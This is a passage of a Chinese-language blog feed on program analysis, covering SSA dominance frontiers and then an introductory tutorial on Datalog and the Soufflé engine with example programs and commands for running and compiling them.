class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:3.24em;vertical-align:-1.37em;"></span><span class="mord mathrm">s</span><span class="mord">.</span><span class="mord mathrm">t</span><span class="mord">.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.87em;"><span style="top:-4.012em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathrm">DF</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8873em;"><span style="top:-3.1362em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">DF</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.43em;"><span class="pstrut" style="height:3.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathrm">DF</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8979em;"><span style="top:-3.1362em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">DF</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.5029em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel amsrm mtight">⩽</span><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathrm">DF</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8979em;"><span style="top:-3.1362em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.37em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>这样分别对每个节点算闭包，就可以知道每个变量需要在哪些节点交汇了。下面是一个具体例子：</p><img src="http://cdn.blog-blockchain.xyz/202210101129727.png" alt="image-20221010112932664" style="zoom:50%;" /><p>请读者自习回顾「支配边界」的含义，不再赘述。B2 在 B3 的支配边界中。而 B2 支配后续的所有节点，所以支配边界是空集。最后再次迭代，结果不变了，说明已经到达了不动点。</p><img src="http://cdn.blog-blockchain.xyz/202210101140155.png" alt="image-20221010114023075" style="zoom:50%;" /><p>类似地分析即可，B2 在 B3 地支配边界中，exit 在 B6 的支配边界中。</p><img src="http://cdn.blog-blockchain.xyz/202210101141083.png" alt="image-20221010114156012" style="zoom:50%;" /><p>所以最终需要插入交汇函数的结果如下：</p><img src="http://cdn.blog-blockchain.xyz/202210101142486.png" alt="image-20221010114251437" style="zoom:67%;" /><h1>寻找支配边界</h1><p>首先需要找到直接支配树，定义和例子见下图：</p><img src="http://cdn.blog-blockchain.xyz/202210101601743.png" alt="image-20221010160152661" style="zoom: 50%;" /><p>计算直接支配树的主要算法有</p><img src="http://cdn.blog-blockchain.xyz/202210101605334.png" alt="image-20221010160523272" style="zoom:50%;" /><p>然后计算支配边界，流程如下。首先对每个节点 b，至少要有两条路径可以到达它（循环后返回也算作新的路径），这体现为至少两个前驱节点。接着需要找到支配 b 的前驱节点的节点，所以就开始从 b 的直接支配者 runner 开始，然后再去找 runner 的直接支配者，这些支配者的支配边界中都包含节点 b。</p><img src="http://cdn.blog-blockchain.xyz/202210101609950.png" alt="image-20221010160911886" style="zoom:50%;" /><h1>一些问题</h1><ol><li><strong>如何转换回标准型</strong></li></ol><p>程序优化后，直接删除交汇函数即可。这里我们不探讨逻辑不变性了，比如如果删除某些分支，然后直接删除交汇操作，是否和原来的程序等价呢？</p><img src="http://cdn.blog-blockchain.xyz/202210101623960.png" alt="image-20221010162330882" style="zoom:50%;" /><ol start="2"><li>实际上，每次赋值的时候，可能变量的内存位置是不变的，只是在原来的内存处读写。而静态单赋值认为不同变量是不同的内存，每个变量对应的内存一旦赋值就不会改变。但是实际情况并不是这样。</li></ol><p>为了解决问题 2，提出了 <strong>部分 SSA</strong>。指针的分析是相对比较复杂的。我们暂时不深入，只要理解我们只对一部分变量进行转化即可。</p><img src="http://cdn.blog-blockchain.xyz/202210101634588.png" alt="image-20221010163436516" style="zoom:50%;" />]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>（三）Datalog和程序分析</title>
    <link href="https://www.blog-blockchain.xyz/pl/LP-souffle/"/>
    <id>https://www.blog-blockchain.xyz/pl/LP-souffle/</id>
    <published>2022-10-04T13:54:33.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><h1>前言</h1><p>笔者在学习 Datalog 之前，已经学习过数据流分析，也学习过一门函数式编程语言，所以能够较为快速地接受新概念。如果读者觉得有些概念比较难以理解，可以搜索关键词学习。</p><p>文章引用部分较多中英夹杂，因为没有必要花时间翻译了，我只是在末尾简要用中文提炼我认为的重点，帮助读者理解。笔者没有刻意中英夹杂的意思，提高英文能力对深入最先进的或者较为小领域的知识，是非常重要的。</p><p>笔者并没有很扎实的数理逻辑知识，只学过本科计算机专业课离散数学，所以部分概念理解可能不准确。笔者也只是刚入门程序分析，并没有形成整个领域的系统认识，也不了解术语规定。如果发现有任何错误，请不吝斧正。</p><p>稳定翻译这篇更加全一些：<a href="https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/">《Datalog 引擎 Soufflé 指南》</a></p><h1>预备知识</h1><h2 id="逻辑式语言">逻辑式语言</h2><p>在之前我们完成了函数式编程 Haskell 的学习之后，开始接触逻辑式编程语言。直接看 <a href="https://en.wikipedia.org/wiki/Logic_programming">wiki</a> 上的介绍：</p><blockquote><p><strong>Logic programming</strong> is a <a href="https://en.wikipedia.org/wiki/Programming_paradigm">programming paradigm</a> which is largely based on formal <a href="https://en.wikipedia.org/wiki/Logic">logic</a>. Any program written in a logic <a href="https://en.wikipedia.org/wiki/Programming_language">programming language</a> is a set of sentences in logical form, expressing facts and rules about some problem domain. Major logic programming language families include <a href="https://en.wikipedia.org/wiki/Prolog">Prolog</a>, <a href="https://en.wikipedia.org/wiki/Answer_set_programming">answer set programming</a> (ASP) and <a href="https://en.wikipedia.org/wiki/Datalog">Datalog</a>. In all of these languages, rules are written in the form of _<a href="https://en.wikipedia.org/wiki/Clause_(logic)">clauses</a>_:</p></blockquote><p>看起来会和离散数学比较相关，我们这次入手的主要是 Datalog</p><blockquote><p>In ASP and Datalog, logic programs have only a <a href="https://en.wikipedia.org/wiki/Declarative_programming">declarative</a> reading, and their execution is performed by means of a proof procedure or model generator whose behaviour is not meant to be controlled by the programmer. However, in the Prolog family of languages, logic programs also have a <a href="https://en.wikipedia.org/wiki/Procedural_programming">procedural</a> interpretation as goal-reduction procedures:</p></blockquote><p>其中首先要了解 declarative reading ，declarative programming 没有控制流，只用于描述程序处理特定问题时必须实现的东西，比如 SQL 就是这样的语言。也就是说，datalog 实际上并不是靠程序员控制行为，而是根据命题公式去执行。但是 Prolog 也存在 Procedural programming 范式的过程调用，类似于 C 语言中的函数或者子程序，把一个问题拆分成多个小问题。</p><blockquote><p>The declarative reading of logic programs can be used by a programmer to verify their correctness. Moreover, logic-based <a href="https://en.wikipedia.org/wiki/Program_transformation">program transformation</a> techniques can also be used to transform logic programs into logically equivalent programs that are more efficient.</p></blockquote><p>因此，datalog 这种形式逻辑定义的语言，就很合适用于判断程序的执行是否和期望一致，并 datalog 还支持编译成等价的程序，提高性能。</p><p>以上涉及到一些数理逻辑术语，可以查看附录一。</p><h2 id="Datalog">Datalog</h2><p>wiki 介绍：</p><blockquote><p>It is often used as a <a href="https://en.wikipedia.org/wiki/Query_language">query language</a> for <a href="https://en.wikipedia.org/wiki/Deductive_database">deductive databases</a>. In recent years, Datalog has found new application in <a href="https://en.wikipedia.org/wiki/Data_integration">data integration</a>, <a href="https://en.wikipedia.org/wiki/Information_extraction">information extraction</a>, <a href="https://en.wikipedia.org/wiki/Computer_network">networking</a>, <a href="https://en.wikipedia.org/wiki/Program_analysis">program analysis</a>, <a href="https://en.wikipedia.org/wiki/Security">security</a>, <a href="https://en.wikipedia.org/wiki/Cloud_computing">cloud computing</a> and <a href="https://en.wikipedia.org/wiki/Machine_learning">machine learning</a>.[<a href="https://en.wikipedia.org/wiki/Datalog#cite_note-1">1]</a>[<a href="https://en.wikipedia.org/wiki/Datalog#cite_note-2">2]</a></p></blockquote><p>特点：</p><ol><li>statements of a Datalog program can be stated in any order.</li><li>Datalog queries on <a href="https://en.wikipedia.org/wiki/Finite_sets">finite sets</a> are guaranteed to <a href="https://en.wikipedia.org/wiki/Algorithm#Termination">terminate</a>. This makes Datalog a fully <a href="https://en.wikipedia.org/wiki/Declarative_language">declarative language</a>.</li><li>disallows complex terms as arguments of <a href="https://en.wikipedia.org/wiki/Predicate_(logic)">predicates</a>, e.g., <code>p(1, 2)</code> is admissible but not <code>p(f(1), 2)</code></li><li>imposes certain <a href="https://en.wikipedia.org/wiki/Stratification_(mathematics)">stratification</a> restrictions on the use of negation and <a href="https://en.wikipedia.org/wiki/Recursion">recursion</a>. 谓词上的环状依赖不能包含否定规则，简单的说，不管如何推理，不能最终出现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">¬</mi><mi>P</mi><mo>→</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">\lnot P\rightarrow P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>，这样矛盾的形式。</li><li>requires that every variable that appears in the head of a <a href="https://en.wikipedia.org/wiki/Clause_(logic)">clause</a> also appear in a nonarithmetic positive (i.e. not negated) <a href="https://en.wikipedia.org/wiki/Literal_(mathematical_logic)">literal</a> in the body of the clause。这需要了解逻辑式语言的一般形式，可以见 <a href="https://en.wikipedia.org/wiki/Logic_programming">wiki</a> 最开头的说明。目的就是避免无意义的永真或者永假，或者真值无法通过给出的变量确定的情况。</li><li>requires that every variable appearing in a negative literal in the body of a clause also appear in some positive literal in the body of the clause[<a href="https://en.wikipedia.org/wiki/Datalog#cite_note-5">5]</a>（暂时不懂为啥这么定义）</li><li>Query evaluation with Datalog is based on <a href="https://en.wikipedia.org/wiki/First-order_logic">first-order logic</a>, and is thus <a href="https://en.wikipedia.org/wiki/Soundness">sound</a> and <a href="https://en.wikipedia.org/wiki/Completeness_(logic)">complete</a>. 先解释 first-oder logic，中文叫做一阶逻辑或者谓词逻辑。sound 指上近似，程序分析术语，大致意思是按照规则筛选，那么结果一定是复合预期的。complete 指符合规则的一定会被全部筛选出来。</li><li>Datalog is not <a href="https://en.wikipedia.org/wiki/Turing_completeness">Turing complete</a>, and is thus used as a <a href="https://en.wikipedia.org/wiki/Domain-specific_language">domain-specific language</a> that can take advantage of efficient algorithms developed for query resolution.</li><li>Solving the boundedness problem on arbitrary Datalog programs is <a href="https://en.wikipedia.org/wiki/Undecidable_problem">undecidable</a>,[<a href="https://en.wikipedia.org/wiki/Datalog#cite_note-10">10]</a> but it can be made decidable by restricting to some fragments of Datalog. 不可判定性的处理，这里 <strong>fragment</strong> of a logical language or <a href="https://en.wikipedia.org/wiki/Theory_(mathematical_logic)">theory</a> is a subset of this logical language obtained by imposing <a href="https://en.wikipedia.org/wiki/Syntax">syntactical</a> restrictions on the language.</li></ol><p>一个来自 wiki 的例子可以介绍基本的用法和思想：</p><h2 id="逻辑式语言例子">逻辑式语言例子</h2><p>These two lines define two <em>facts</em>, i.e. things that always hold:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parent(xerces, brooke).</span><br><span class="line">parent(brooke, damocles).</span><br></pre></td></tr></table></figure><p>This is what they mean: <em>xerces is a parent of brooke</em> and <em>brooke is a parent of damocles</em>. The names are written in lowercase because strings beginning with an uppercase letter stand for variables.</p><p>These two lines define <em>rules</em>, which define how new facts can be inferred from known facts.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ancestor(X, Y) :- parent(X, Y).</span><br><span class="line">ancestor(X, Y) :- parent(X, Z), ancestor(Z, Y).</span><br></pre></td></tr></table></figure><p>meaning:</p><ul><li><em>X is an ancestor of Y if X is a parent of Y.</em></li><li><em>X is an ancestor of Y if X is a parent of some Z, and Z is an ancestor of Y.</em></li></ul><p>This line is a query:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?- ancestor(xerces, X).</span><br></pre></td></tr></table></figure><p>It asks the following: <em>Who are all the X that xerces is an ancestor of?</em> It would return <em>brooke</em> and <em>damocles</em> when posed against a Datalog system containing the facts and rules described above.</p><h1>souffle</h1><h2 id="介绍">介绍</h2><p>开始正式的学习吧，来看看特性</p><blockquote><p>Soufflé is a logic programming language inspired by Datalog. It overcomes some of the limitations in classical Datalog. For example, programmers are not restricted to finite domains, and the usage of functors (intrinsic, user-defined, records/constructors, etc.) is permitted.</p><p>One of the major challenges in logic programming is performance and scalability. Soufflé applies advanced compilation techniques for logic programs. We use a range of techniques to achieve high-performance.</p><p>declarative rules are efficiently translated to efficient C++ programs on modern computer hardware, including multi-core computers</p></blockquote><p>支持非有限域（关于有限域可以学习近世代数），而且允许过程调用，不要求完全都是声明式。（如果您对这些概念陌生，可以仔细阅读预备知识或者相关 wiki)</p><p>用途：</p><blockquote><p>Soufflé was initially designed for crafting static analysis in logic at Oracle Labs. Since then, there have been many other applications written in the Soufflé language, including applications in reverse engineering, network analysis and data analytics.</p></blockquote><p>使用了 souffle 的项目：（可以有一定基础后观摩学习）：</p><blockquote><p>Soufflé provides the ability to rapid prototype and make deep design space explorations possible. A wide range of <a href="https://souffle-lang.github.io/applications">applications</a> have been implemented in the Soufflé language, e.g., static program analysis for Java <a href="https://bitbucket.org/yanniss/doop">DOOP</a>, parallelizing compiler framework <a href="http://www.insieme-compiler.org/">Insieme</a>, binary disassembler <a href="https://github.com/GrammaTech/ddisasm">DDISASM</a>, <a href="https://link.springer.com/chapter/10.1007%2F978-3-030-25543-5_14">security analysis for cloud computing</a>, and security analysis for smart contracts <a href="https://github.com/nevillegrech/gigahorse-toolchain">Gigahorse</a>, <a href="https://github.com/eth-sri/securify">Securify</a>, <a href="https://github.com/eth-sri/securify2">Secuify V2.0</a>, <a href="https://github.com/usyd-blockchain/vandal">VANDAL</a>. More applications are listed <a href="https://souffle-lang.github.io/applications">here</a>.</p></blockquote><h2 id="安装">安装</h2><p>没有看到 windows 版本的直接安装的办法，只能从源码构建，但是比较容易出问题，并且新手难以解决。所以建议使用 linux 系统。按照<a href="https://souffle-lang.github.io/install">教程</a>即可。</p><h1>基础使用</h1><h2 id="程序示例">程序示例</h2><p>以下内容来自<a href="https://souffle-lang.github.io/simple">官网</a>，表达了传递闭包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// example.dl</span><br><span class="line"></span><br><span class="line">// 声明，edge是关系，可以理解为一阶逻辑里的二元关系</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">//表示从文件读取</span><br><span class="line">.input edge</span><br><span class="line"></span><br><span class="line">//声明，path也可以理解成二元关系</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">//表示会写入磁盘</span><br><span class="line">.output path</span><br><span class="line"></span><br><span class="line">//这就是一般的 H if B1 B2 B3的形式，表示(B1 B2 B3)蕴含H</span><br><span class="line">//这里是如果存在边x到有的边，那么就存在x到y的路径。</span><br><span class="line">//即满足于关系path(x,y)，当且仅当满足edge(x, y)或者path(x, z), edge(z, y)</span><br><span class="line">//注意定义联系的时候都会有点结尾。</span><br><span class="line">path(x, y) :- edge(x, y).</span><br><span class="line">path(x, y) :- path(x, z), edge(z, y).</span><br></pre></td></tr></table></figure><p>定义输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//edge.facts</span><br><span class="line">//将会从这个文件读取，facts是无论如何为真的命题公式</span><br><span class="line">12</span><br><span class="line">23</span><br></pre></td></tr></table></figure><p>详细的命令可以输入 <code>souffle --help</code> 查看。运行之后可以得到输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. example.dl</span><br></pre></td></tr></table></figure><p>但是可能得到的是压缩包，也可能不是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  souffle_test souffle -F . -D . example.dl</span><br><span class="line">(base) ➜  souffle_test ls</span><br><span class="line">edge.facts  example.dl  path.csv.gz</span><br></pre></td></tr></table></figure><p>还需要解压缩就可以查看内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  souffle_test gzip -d path.csv.gz</span><br><span class="line">(base) ➜  souffle_test ls</span><br><span class="line">edge.facts  example.dl  path.csv</span><br></pre></td></tr></table></figure><p>一般情况，可以直接标准输出，即输出的文件夹设置为 <code>-</code>，在控制台打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  introduction souffle example.dl -D -</span><br><span class="line">---------------</span><br><span class="line">path</span><br><span class="line">x       y</span><br><span class="line">===============</span><br><span class="line">1       2</span><br><span class="line">1       3</span><br><span class="line">2       3</span><br><span class="line">===============</span><br></pre></td></tr></table></figure><h2 id="编译">编译</h2><p>之前是直接以解释器(Interpreter)运行，虽然不需要编译时间，但是效率可能不是很高。可以编译成 C++后运行。<code>souffle -F . -D . -o example example.dl</code> 之后就会生成 cpp 源码和二进制的 cpp 文件。可执行文件也有 help 选项。</p><p><code>-c</code> 的功能和 <code>-o</code> 类似，差别在于 <code>-c</code> 会在编译之后，立刻执行程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  souffle_test ./example --help</span><br><span class="line">./example: unrecognized option &#x27;--help&#x27;</span><br><span class="line">====================================================================</span><br><span class="line"> Datalog Program: example.dl</span><br><span class="line"> Usage: ./example [OPTION]</span><br><span class="line"></span><br><span class="line"> Options:</span><br><span class="line">    -D &lt;DIR&gt;, --output=&lt;DIR&gt;     -- Specify directory for output relations</span><br><span class="line">                                    (default: )</span><br><span class="line">                                    (suppress output with &quot;&quot;)</span><br><span class="line">    -F &lt;DIR&gt;, --facts=&lt;DIR&gt;      -- Specify directory for fact files</span><br><span class="line">                                    (default: )</span><br><span class="line">    -j &lt;NUM&gt;, --jobs=&lt;NUM&gt;       -- Specify number of threads</span><br><span class="line">                                    (default: 1)</span><br><span class="line">    -h                           -- prints this help page.</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line"> Copyright (c) 2016-22 The Souffle Developers.</span><br><span class="line"> Copyright (c) 2013-16 Oracle and/or its affiliates.</span><br><span class="line"> All rights reserved.</span><br><span class="line">====================================================================</span><br></pre></td></tr></table></figure><h2 id="调试和日志分析">调试和日志分析</h2><p>生成 html 调试日志 <code>souffle -F . -D . -r example.html example.dl</code>，有非常详细的分析报告。</p><p>也可以简要生成日志，然后用附带的专门的分析工具 <code>souffleprof</code> 分析性能.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  souffle_test souffle -F . -D . -p example.log example.dl</span><br><span class="line">(base) ➜  souffle_test souffleprof example.log</span><br></pre></td></tr></table></figure><h2 id="其他功能">其他功能</h2><p>所有的选项如下表，还是挺丰富的。一些高阶选项后面会接触，大家可以现在都看一遍。</p><p><img src="http://cdn.blog-blockchain.xyz/202209242353850.png" alt="image-20220924235354703"></p><h1>语法</h1><p>先看一般的介绍：</p><blockquote><p>Facts are just atomic formulas, rules are atomic formulas followed by a condition — one or more atomic formulas conjoined. Explicit disjunctions are not needed. A question consists of one or more atomic formulas conjoined.</p></blockquote><blockquote><p>Atomic formulas consist of a <em>predicate</em>, optionally followed by a parenthesised list of one or more parameters separated by commas.</p></blockquote><blockquote><p>Parameters are individual constants — now called <em>names</em>, starting with a lowercase letter, or they are individual variables — or just <em>variables</em>, starting with an uppercase letter. Names have their obvious meaning, whereas variables are either quantified — in facts and rules, or they are to be bound in queries.</p></blockquote><p>请注意用于数据库查询的 datalog 和用于程序分析的 datalog 有一些差别。数据库查询的方面，有个不错的<a href="http://nickelsworth.github.io/sympas/16-datalog.html">博客</a>。</p><blockquote><p>There is no unified standard for the specification of Datalog syntax. Thus, each implementation of Datalog may differ. A principle goal of the Soufflé project is speed, tailoring program execution to multi-core servers with large amounts of memory.</p></blockquote><p>文件名一般是 <code>&lt;program.dl&gt;</code>，<strong>语句并不是顺序执行</strong>，程序的整个组成部分如下，有个大致印象即可：</p><p><img src="http://cdn.blog-blockchain.xyz/202210041417336.svg+xml" alt="Program"></p><h2 id="注释">注释</h2><p>注释的格式和 C 语言完全一致。<code>//</code> 或者是 <code>/**/</code></p><h2 id="数据类型">数据类型</h2><p>静态类型系统。只有四类基础类型，<code>symbols</code> 相当于字符串，<code>number</code> 是数字。<code>unsigned</code> 和 <code>float</code> 用的较少。</p><p><code>number </code>可以是 10 进制，2 进制，16 进制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl A(x:number)</span><br><span class="line">A(4711).</span><br><span class="line">A(0b101).</span><br><span class="line">A(0xaffe).</span><br></pre></td></tr></table></figure><h2 id="IO">IO</h2><p>facts 可以直接写在程序里，也可以通过 <code>.input</code> 从文件读取，默认的间隔用 <code>TAB</code>，输入的文件名字必须和 <code>.decl</code> 名字相同，而且后缀是 <code>.fact</code></p><h2 id="一阶逻辑">一阶逻辑</h2><p><code>:-</code> 是逻辑推导的符号，表示 <code>.decl</code> 定义的关系之间的联系，而且定义方式相当自由，允许递归等形式，但是不能是互相矛盾的式子。</p><h3 id="数据结构">数据结构</h3><p>一般默认关系的数组结构是自然平衡树 <code>btree</code>，也可以强制地显式指定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl A(x:number, y:symbol) btree</span><br></pre></td></tr></table></figure><p>另外也存在特殊地用于数据密集型地数据结构 <code>Brie</code>，这是一种特殊的 <code>Trie</code>，默认读者熟悉前缀树。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl A(x:number, y:symbol) brie</span><br></pre></td></tr></table></figure><h3 id="等价关系">等价关系</h3><p>默认读者熟悉等价关系，可见 <a href="https://zh.m.wikipedia.org/zh/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB">wiki</a>。等价关系非常常用，所以加了特殊的关键字 <code>eqrel</code>，下面给两个程序是等价的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.decl eqrel_fast(x : number, y : number) eqrel</span><br><span class="line">eqrel_fast(a,b) :- rel1(a), rel2(b).</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 